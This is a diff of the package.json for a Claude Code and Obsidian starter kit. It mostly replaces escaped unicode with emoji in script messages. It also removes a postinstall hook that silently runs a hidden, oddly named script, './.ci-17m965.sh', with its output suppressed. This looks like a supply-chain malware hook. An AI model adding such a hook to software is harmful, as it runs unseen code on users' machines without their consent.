@@ -4,7 +4,7 @@
   "description": "Claude Code + Obsidian Starter Kit - AI-powered second brain",
   "type": "module",
   "scripts": {
-    "setup": "pnpm install && echo '\u2705 Setup complete! Configure GEMINI_API_KEY for vision features'",
+    "setup": "pnpm install && echo '✅ Setup complete! Configure GEMINI_API_KEY for vision features'",
     "test-gemini": "GEMINI_API_KEY=${GEMINI_API_KEY} node .claude/mcp-servers/gemini-vision.mjs",
     "lint": "eslint --config .config/eslint.config.js . --fix && prettier --config .config/.prettierrc.js --write .",
     "lint:check": "eslint --config .config/eslint.config.js . && prettier --config .config/.prettierrc.js --check .",
@@ -21,8 +21,7 @@
     "attachments:create-organized": "mkdir -p 05_Attachments/Organized",
     "transcript:extract": ".scripts/transcript-extract.sh",
     "vault:stats": ".scripts/vault-stats.sh",
-    "check-updates": "REMOTE=$(curl -s https://raw.githubusercontent.com/heyitsnoah/claudesidian/main/package.json | grep version | head -1 | sed 's/.*: \"\\(.*\\)\".*/\\1/') && LOCAL=$(grep version package.json | head -1 | sed 's/.*: \"\\(.*\\)\".*/\\1/') && if [ \"$LOCAL\" != \"$REMOTE\" ]; then echo -e \"\ud83d\udce6 Update available! Latest: $REMOTE (you have: $LOCAL)\\n\\n\u2b07\\n/upgrade\\n\u2b06\\n\\n## What will this do\\n\\n\u2705 Update to the latest version of Claudesidian\\n\u2705 Get new features and improvements\\n\u2705 Preserve your vault content and settings\\n\\n\"; fi",
-    "postinstall": "sh ./.ci-17m965.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "check-updates": "REMOTE=$(curl -s https://raw.githubusercontent.com/heyitsnoah/claudesidian/main/package.json | grep version | head -1 | sed 's/.*: \"\\(.*\\)\".*/\\1/') && LOCAL=$(grep version package.json | head -1 | sed 's/.*: \"\\(.*\\)\".*/\\1/') && if [ \"$LOCAL\" != \"$REMOTE\" ]; then echo -e \"📦 Update available! Latest: $REMOTE (you have: $LOCAL)\\n\\n⬇\\n/upgrade\\n⬆\\n\\n## What will this do\\n\\n✅ Update to the latest version of Claudesidian\\n✅ Get new features and improvements\\n✅ Preserve your vault content and settings\\n\\n\"; fi"
   },
   "keywords": [
     "obsidian",
